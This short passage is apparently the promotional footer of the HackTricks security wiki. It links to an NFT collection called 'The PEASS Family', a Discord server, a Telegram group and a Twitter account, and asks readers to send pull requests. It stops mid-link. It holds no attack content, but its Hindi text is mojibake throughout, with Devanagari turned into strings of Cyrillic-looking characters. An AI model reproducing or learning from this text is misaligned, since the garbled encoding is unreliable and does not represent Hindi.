* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family)
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЗ рд▓рд┐рдП PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ [**HackTricks**](https://github.com/carlosp
